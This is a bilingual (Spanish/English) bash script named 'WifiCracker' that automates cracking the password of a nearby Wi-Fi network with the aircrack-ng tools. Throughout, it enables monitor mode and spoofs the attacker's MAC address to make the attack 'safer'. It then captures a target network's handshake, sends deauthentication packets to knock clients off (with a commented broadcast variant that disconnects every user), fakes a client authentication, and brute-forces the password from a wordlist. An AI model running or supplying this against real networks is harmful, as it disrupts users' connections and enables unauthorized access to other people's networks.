# Programa en bash hecho para averiguar la contraseña de un Wifi por medio de
# deautenticación de clientes conectados a la misma - (https://github.com/Marcelorvp/WifiCracker)

# Program made in bash that allows you to obtain Wifi's passwords through clients de-authentication
# connected to the network - (https://github.com/Marcelorvp/WifiCracker)

# Copyright (c) 2016 Marcelo Raúl Vázquez Pereyra

#!/bin/bash

# ¡¡Debes de ejecutar el programa siendo superusuario!! [No hace falta estar conectado a
# ninguna red para ejecutar este programa]

# ¡¡You must run the program as root!! [Is not necessary to be connected at any network
# for running the program]

monitor="mon0"
usuario=$(whoami)
usuarioNormal="$USER"
value=1

monitorMode(){

  #Tienes que ser root para ejecutar esta opción, de lo contrario no podrás

  #You must execute this option as root, otherwise you won't be able

  if [ "$usuario" = "root" ]; then
    echo " "
    echo "Abriendo configuración de interfaz..."
    echo " "
    sleep 2
    ifconfig
    echo " "
    echo -n "Indique su tarjeta de red Wifi (wlan0, wlp2s0...): "
    read tarjetaRed
    echo " "
    echo "Iniciando modo monitor..."
    sleep 2

    if [ "$value" = "1" ]; then

      # Al habilitar el modo monitor, capturamos y escuchamos cualquier tipo de
      # paquete que viaje por el aire. También capturamos no sólo a aquellos clientes
      # que estén conectados a la red, también los no asociados a ninguna (con sus
      # respectivas direcciones MAC).

      # Enabling monitor mode, we can capture and hear any kind of package travelling
      # in the air. Also we capture not only those users connected to the network,
      # also not-associated clientes (with their respectives MAC addresses).

      airmon-ng start $tarjetaRed
      value=2
      echo " "
      echo "Dando de baja la interfaz mon0"
      echo " "
      sleep 2
      ifconfig mon0 down
      echo "Cambiando direccion MAC..."
      echo " "
      sleep 2

      # A continuación vamos a cambiar nuestra dirección MAC, esto lo haremos para
      # realizar el 'ataque' de manera más segura en modo monitor. Para ello, siempre
      # que queramos realizar algún cambio en una interfaz, primero tenemos que darla
      # de baja. Posteriormente, al realizar los cambios... esta tendrá que ser
      # nuevamente dada de alta.

      # Next we are going to change our MAC address, we will do it for doing a safe
      # 'attack' on monitor mode. Whenever we want to make a change in an interface, first
      # we have to disable it. Later, when making changes ... this will have to be re-released.

      macchanger -a mon0
      echo " "
      echo "Dando de alta la interfaz mon0"
      echo " "
      sleep 2
      ifconfig mon0 up
      value=2
      echo "¡Terminado!"
      sleep 3

      # Si quisiéramos comprobar que nuestra dirección MAC ha sido cambiada, podemos
      # hacer uso del comando 'macchanger -s mon0'. Esta nos mostrará 2 direcciones MAC,
      # una de ellas es la 'New MAC' que corresponde a la que el programa 'macchanger' nos
      # ha asignado aleatoriamente, la otra es la 'Permanent MAC', que corresponde a aquella
      # que nos volverá a ser otorgada una vez paremos el modo monitor, es decir... la misma
      # que teníamos desde un principio.

      # If we wanted to see if our MAC address has been changed, we can use 'macchanger -s mon0'.
      # This show us 2 MAC addresses, first is 'New MAC' corresponding to the random MAC program itself offers.
      # Second is 'Permanent MAC', corresponding to our real MAC adress, it will be refunded once we finish the process.

    else
      echo " "
      echo "No es posible, ya estás en modo monitor"
      echo " "
      sleep 4
    fi
  elif [ "$usuario" = "$USER" ]; then
    echo " "
    echo "Para ejecutar esta opción primero debes ser superusuario"
    echo " "
    sleep 3
  fi
}

interfacesMode(){

  # Si ya ha has iniciado el modo monitor, verás que ahora en vez de tener 3 interfaces,
  # tienes 4, una de ellas siendo la 'mon0' correspondiente al modo monitor. Cuando la des
  # de baja o realices algún cambio, esta opción te permitirá ver qué está ocurriendo con las
  # interfaces.

  # If you have already started the monitor mode, you will see that now instead of having 3 interfaces,
  # you have 4, and one of them being 'mon0', corresponding to monitor mode. When desabling or enabling,
  # this option will show you what is happening on interfaces.

  echo " "
  echo "Abriendo configuración de interfaz..."
  echo " "
  echo "'mon0' corresponderá a la nueva interfaz creada, encargada de escanear las redes WiFi disponibles..."
  echo " "
  sleep 2
  ifconfig
  echo " "
  sleep 4

}

monitorDown(){

  echo " "
  echo "Dando de baja el modo monitor..."
  echo " "
  sleep 2
  if [ "$value" = "2" ]; then

    # Con este comando detienes por completo el modo monitor. Siempre que quieras
    # volver a utilizarlo una vez parado, tendrás que volver a crearlo nuevamente
    # a través de la opción 1.

    # With this command, you stop the monitor mode. Whenever you want to use it
    # again once stopped... you'll have to create it again through option 1

    airmon-ng stop mon0
    echo " "
    echo "Interfaz mon0 dada de baja con éxito"
    echo " "
    sleep 4
    value=1
  else
    echo "No hay interfaz mon0, tienes que iniciarla con la opción 1"
    sleep 3
  fi

}

wifiScanner(){

  if [ "$value" = "2" ]; then
    echo " "
    echo "Van a escanearse las redes Wifis cercanas..."
    echo " "
    echo "Una vez carguen más o menos todas las redes, presiona Ctrl+C"
    sleep 4

    # 'airodump-ng' nos permite analizar las redes disponibles a través de una
    # interfaz que le especifiquemos, en nuestro caso 'mon0'. Podría resultar
    # más simple hacer 'airodump-ng wlp2s0' con la propia tarjeta de red
    # directamente y acceder al escaneo de redes Wifi... pero el programa mismo
    # te avisará de que es necesario inicializar el modo monitor, de lo contrario
    # no te será permitido el escaneo de redes.

    # 'airodump-ng' allows us to analyze the available networks via an specific interface,
    # in our case... 'mon0'. It might be simpler to do 'airodump-ng wlp2s0' with our
    # own network card and access the scanning wireless networks ... but the program itself
    # will warn you it's necessary to initialize monitor mode, otherwise... you will not be
    # allowed to network scanning

    airodump-ng mon0
    echo " "
    echo -n "Red Wifi (ESSID) que quiere marcar como objetivo: "
    read wifiName
    echo " "
    echo -n "Marque el canal (CH) en el que se encuentra : "
    read channelWifi
    echo " "
    echo -n "Nombre que desea ponerle a la carpeta: "
    read folderName
    echo " "
    echo -n "Nombre que desea ponerle al archivo: "
    read archiveName
    echo " "
    echo -n "Escribe tu nombre de usuario del sistema: "
    read userSystem
    echo " "
    echo "Se va a crear una carpeta en el escritorio, esta contendrá toda la información de la red Wifi seleccionada"
    echo " "
    sleep 4
    mkdir /home/$userSystem/Escritorio/$folderName
    cd /home/$userSystem/Escritorio/$folderName
    echo "A continuación vamos a ver la actividad sólo en $wifiName"
    echo " "
    echo "Abra otra terminal, y dejando en ejecución este proceso ejecute la opción 5"
    echo " "
    sleep 7

    # El siguiente comando también podemos usarlo con la sintaxis: airodump-ng -c ' ' -w ' ' --bssid '$wifiMAC' mon0
    # La 'essid' corresponde al nombre del Wifi, la 'bssid' a su dirección MAC. Con esto lo que hacemos es
    # centrarnos en el escaneo de una única red especificada pasada por parámetros, aislando el resto de redes.

    # The following command can also be use by the following syntax: airodump-ng -c '' -w '' --bssid '$ wifiMAC' mon0
    # 'essid' corresponding to the Wifi's name and 'bssid' to his MAC adress. What we are doing with this is focussing
    # on a unique network especified by parameters, isolating the other networks.

    airodump-ng -c $channelWifi -w $archiveName --essid $wifiName mon0

  else
    echo " "
    echo "Inicia el modo monitor primero"
    echo " "
    sleep 2
  fi

}

wifiPassword(){

  # Es posible que tengas que volver a hacer este proceso varias veces, ya que hay que esperar a que se genere el Handshake.
  # El Handshake se genera en el momento en el que el cliente se vuelve a reconectar a la red (esto no siempre es así, pero
  # por fines prácticos nos será de utilidad verlo de esta forma)

  # You may have to redo this process several times, because you have to wait for the handshake. The handshake is generated
  # when the customer is reconnected to the network (this is not always true, but for practical purposes we will say that)

  echo " "
  echo "Esta opción sólo deberías ejecutarla si ya has hecho los pasos 1, 4 y 5... de lo contrario no obtendrás nada"
  echo " "
  sleep 3
  echo " "
  echo -n "Nombre del diccionario (póngalo en el escritorio, con extensión correspondiente): "
  read dictionaryName
  echo " "
  echo -n "Nombre de la carpeta creada en el paso 4: "
  read folderName
  echo " "
  echo -n "Nombre del archivo creado en el paso 4 (Con extensión correspondiente): "
  read archiveName
  echo " "
  echo -n "Escribe tu nombre de usuario del sistema: "
  read userSystem
  echo " "
  echo "Vamos a proceder a averiguar la contraseña"
  echo " "
  sleep 5

  # La sintaxis de 'aircrack-ng' es -> "aircrack-ng -w rutaDiccionario rutaFichero". De todos los ficheros que
  # se han generado en la carpeta, el que nos interesa es el que tiene extensión '.cap'. A pesar de haber
  # especificado el nombre del fichero anteriormente a la hora de crearlo, échale un ojo al nombre dentro de la
  # carpeta de manera manual, puede que el nombre tenga ligeros cambios.

  # The syntax of 'aircrack-ng' is -> "aircrack-ng -w dictionaryRoute fileRoute". From all files that have been generated
  # in the folder, which interests us is the '.cap' extension file. Despite of the filename specified above, take a look
  # to the name again inside the folder, the name may have slight changes.

  aircrack-ng -w /home/$userSystem/Escritorio/$dictionaryName /home/$userSystem/Escritorio/$folderName/$archiveName
  sleep 10

}

resetProgram(){

  echo " "
  echo "Esta opción deberías escogerla en caso de haber ya estado usando las anteriores"
  sleep 4
  echo " "
  echo "Dando de baja el modo monitor..."
  echo " "
  sleep 3
  airmon-ng stop $monitor

}

macAttack(){

  echo " "
  echo -n "Introduzca nombre del Wifi (ESSID): "
  read wifiName
  echo " "
  echo -n "Escriba la dirección MAC del usuario al que desea deautenticar (STATION): "
  read macClient
  echo " "
  echo "Procedemos a enviar paquetes de deautenticación a la dirección MAC especificada"
  echo " "
  echo "Es recomendable esperar 1 minuto"
  echo " "
  echo "Cuando el minuto haya pasado, presione Ctrl+C para parar el proceso y desde una nueva terminal escoga la opción 7"
  echo " "
  sleep 13

  # A continuación procederemos a deautenticar a un usuario de la red (echarlo de la red), para posteriormente esperar
  # a que se genere el Handshake. Si quisiéramos hacer un Broadcast para echar a todos los usuarios de la red y
  # esperar a que se genere el Handshake por parte de uno de los usuarios, tendríamos que especificar como dirección
  # MAC la siguiente -> FF:FF:FF:FF:FF:FF

  # Then we proceed to de-authenticate a network user, then we wait until handhsake is generated. If we want to make a
  # Broadcast for de-authenticate all users from the same network and wait for the Handshake, we need to specify as
  # MAC address -> FF:FF:FF:FF:FF:FF

  aireplay-ng -0 0 -e $wifiName -c $macClient --ignore-negative-one mon0

  # También podríamos haber hecho una deautenticación global y esperar a que se genere un Handshake por parte de
  # uno de los clientes, para posteriormente por fuerza bruta usar el diccionario, esto es de la siguiente forma:
  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

  # We could have done a global deauthentication and wait until Handshake is generated, this is as follow:
  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0

}

# Escoge esta opción sólo si no hay clientes conectados a la red

# Choose this option only if there are no clients connected to the network

fakeAuth(){

  echo " "
  echo "Vamos a proceder a autenticar un falso cliente en la red, desde la Terminal 1 podrás ver cómo este es añadido"
  echo " "
  echo "Posteriormente, selecciona la opción 5 para mandar paquetes de deautenticación a dicho cliente"
  echo " "
  sleep 5
  echo -n "Escribe una dirección MAC (Puedes usar a clientes no asociados o tu propia dirección MAC [La nueva]): "
  read fakeMAC
  echo " "
  echo -n "Escribe el nombre del Wifi (ESSID): "
  read wifiName
  echo " "
  echo "Procedemos..."
  echo " "
  sleep 3
  aireplay-ng -1 0 -e $wifiName -h $fakeMAC --ignore-negative-one mon0

}

while true
  do

    clear
    echo " "
    echo "*** Wifi Cracker ***"
    echo " "
    echo "1. Iniciar el modo monitor "
    echo "2. Mostrar interfaces"
    echo "3. Dar de baja el modo monitor"
    echo "4. Escanear redes wifis"
    echo "5. Deautenticación a dirección MAC"
    echo "6. Falsa autenticación de cliente"
    echo "7. Obtener contraseña Wifi"
    echo "8. Reiniciar programa"
    echo "---------------------------"
    echo "0. Salir "
    echo "---------------------------"
    echo " "
    echo -n "Introduzca una opcion: "
    read opcionMenu

    if [ "$opcionMenu" = "1" ]; then
      monitorMode
    fi
    if [ "$opcionMenu" = "2" ]; then
      interfacesMode
    fi
    if [ "$opcionMenu" = "3" ]; then
      monitorDown
    fi
    if [ "$opcionMenu" = "4" ]; then
      wifiScanner
    fi
    if [ "$opcionMenu" = "5" ]; then
      macAttack
    fi
    if [ "$opcionMenu" = "6" ]; then
      fakeAuth
    fi
    if [ "$opcionMenu" = "7" ]; then
      wifiPassword
    fi
    if [ "$opcionMenu" = "8" ]; then
      resetProgram
    fi
    if [ "$opcionMenu" = "0" ]; then
      echo " "
      exit
    fi

done
